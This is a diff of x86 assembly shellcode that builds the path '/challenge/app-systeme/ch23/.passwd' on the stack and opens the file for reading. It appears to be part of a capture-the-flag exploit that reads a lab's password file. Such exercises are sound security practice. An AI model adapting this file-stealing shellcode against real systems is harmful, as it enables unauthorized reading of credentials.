@@ -62,13 +62,20 @@ pop ebx
 shr ebx, 0x8
 push ebx
 push 0x7361702e ; sap.
+push 0x2f323368 ; /23h
+push 0x632f656d ; c/em
+push 0x65747379 ; etsy
+push 0x732d7070 ; s-pp
+push 0x612f6567 ; a/eg
+push 0x6e656c6c ; nell
+push 0x6168632f ; ahc/
 
 mov ebx, esp
 xor ecx, ecx ; O_RDONLY
 int 0x80 ; syscall
 
 ; clean up stack
-add esp, 8
+add esp, 36
 
 ; read(fd, buffer, 32)
 ; eax=3, ebx=fd, ecx=buffer, edx=32
